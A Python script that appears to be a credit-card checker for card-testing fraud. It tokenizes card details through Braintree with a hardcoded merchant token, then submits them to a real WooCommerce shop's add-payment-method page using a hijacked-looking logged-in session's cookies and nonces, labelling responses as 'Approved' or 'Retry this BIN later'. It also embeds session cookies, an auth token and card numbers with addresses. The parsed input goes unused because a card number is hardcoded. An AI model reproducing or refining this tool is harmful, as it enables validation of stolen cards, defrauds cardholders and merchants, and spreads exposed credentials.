import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	headers = {
    'accept': '*/*',
    'accept-language': 'ar',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjI4MDMxMzEsImp0aSI6ImU0ZWEzNGQ4LTdkNGEtNDRkNy1hZDJkLTcyMGQ1ODlmYjUwZSIsInN1YiI6ImptdnlkeTZudG53N3k3NTgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImptdnlkeTZudG53N3k3NTgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InNjcmFwYm9va2NhcmRzdG9kYXlVU0QifX0.uvI7S63zz9PscQQz0uVh3Wk9kiev7OxuX4XgT_CjpV5A6cDgvIQbiHIkSV1VG8HVxwPl4vWgFdVpE7JIQURnkw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}


	
	json_data = {
	    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '96c3f01f-4c6f-470e-a84b-7c9292e18ccf',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': '4403934952456965',
                'expirationMonth': '02',
                'expirationYear': '2028',
                'cvv': '564',
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '1981 Jennifer Lane',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	'_gid': 'GA1.2.616909346.1722716561',
    'pum-153614': 'true',
    'mcfw-wp-user-cookie': 'MjYwMjZ8MHw2M3wzOTg3N19lOTM5NTdmYmFjMjQ3ZmIwYjg3MTE5MjgyMGY4NDNlNTlmZTJkNGU4ZDZmZmQ1NzBmZTJmMDI2M2U4MDZmMjNj',
    'wfwaf-authcookie-f477f216814335a577873128470ceec9': '26026%7Cother%7Cread%7C54210b254ec1d532b5a60e84e169cd9645a6ede67fb3407d89cd7197c382fd9d',
    'wordpress_logged_in_07d8b92222d8e9870c923e9d0eb5ca77': 'assar32%7C1722889408%7COiAVDT8WEpPn5wfsWfS9iwOuyyJyTxrp2hxpea3g3fq%7Cbed0b29df97215d6b3f56f8a12fc749c502b107dd82bc77194a9f8f346d3d5f8',
    'wpdiscuz_nonce_07d8b92222d8e9870c923e9d0eb5ca77': '2f7e796b5a',
    'woocommerce_items_in_cart': '1',
    'woocommerce_cart_hash': '1fb52f9e911f994513740ca3d81790de',
    'wp_woocommerce_session_07d8b92222d8e9870c923e9d0eb5ca77': '26026%7C%7C1722889444%7C%7C1722885844%7C%7C03bf5012e764d4e6438ecfb5d969603c',
    'cookie_notice_accepted': 'false',
    '_gat_gtag_UA_216485561_1': '1',
    '_gat_UA-216485561-1': '1',
    '_ga': 'GA1.1.128941405.1722716560',
    '_ga_H57L19C2LN': 'GS1.1.1722716559.1.1.1722716731.49.0.0',
}
	
	headers = {
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gid=GA1.2.616909346.1722716561; pum-153614=true; mcfw-wp-user-cookie=MjYwMjZ8MHw2M3wzOTg3N19lOTM5NTdmYmFjMjQ3ZmIwYjg3MTE5MjgyMGY4NDNlNTlmZTJkNGU4ZDZmZmQ1NzBmZTJmMDI2M2U4MDZmMjNj; wfwaf-authcookie-f477f216814335a577873128470ceec9=26026%7Cother%7Cread%7C54210b254ec1d532b5a60e84e169cd9645a6ede67fb3407d89cd7197c382fd9d; wordpress_logged_in_07d8b92222d8e9870c923e9d0eb5ca77=assar32%7C1722889408%7COiAVDT8WEpPn5wfsWfS9iwOuyyJyTxrp2hxpea3g3fq%7Cbed0b29df97215d6b3f56f8a12fc749c502b107dd82bc77194a9f8f346d3d5f8; wpdiscuz_nonce_07d8b92222d8e9870c923e9d0eb5ca77=2f7e796b5a; woocommerce_items_in_cart=1; woocommerce_cart_hash=1fb52f9e911f994513740ca3d81790de; wp_woocommerce_session_07d8b92222d8e9870c923e9d0eb5ca77=26026%7C%7C1722889444%7C%7C1722885844%7C%7C03bf5012e764d4e6438ecfb5d969603c; cookie_notice_accepted=false; _gat_gtag_UA_216485561_1=1; _gat_UA-216485561-1=1; _ga=GA1.1.128941405.1722716560; _ga_H57L19C2LN=GS1.1.1722716559.1.1.1722716731.49.0.0',
    'origin': 'https://scrapbookandcards.com',
    'priority': 'u=0, i',
    'referer': 'https://scrapbookandcards.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"84ba0d1ff0f2c1247c6bd90a488ab10e","fraud_merchant_id":null,"correlation_id":"869dd275918da7a473a8d81c658e858f"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/jmvydy6ntnw7y758/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/jmvydy6ntnw7y758"},"merchantId":"jmvydy6ntnw7y758","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Scrapbook & Cards Today","clientId":"AVSXYnef6QE37IRZwiBm0sChfRRFWjQODfAjBVH-h5eQ-p0ROvARotwDOwNGjhXlZFFNiQJYZu-lJ8Oj","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"scrapbookcardstodayUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': '282a1236ac',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
	
	response = requests.post(
    'https://scrapbookandcards.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	text=response.text
	html_text=response.text
	soup = BeautifulSoup(html_text, 'html.parser')
	if '<head><title>Not Acceptable!</title></head><body><h1>Not Acceptable!</h1><p>An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.</p></body></html>' in response.text:
		return "RISK: Retry this BIN later."
	try:
		error_message = soup.find('div', class_='woocommerce-notices-wrapper').text.strip()
		status_code_start = error_message.find('Status code') + len('Status code')
		status_code_end = error_message.find('</div>')
		result = error_message[status_code_start:status_code_end]
		if 'avs' in result or 'Invalid postal code' in result or 'Insufficient Funds' in result:
			return 'Approved'
		elif 'Please wait for 20 seconds' in result:
			return "RISK: Retry this BIN later."
		else:
			return result
	except:
		result=text
	if 'Payment method successfully added.' in text:
		return "1000: Approved"
		return "RISK: Retry this BIN later."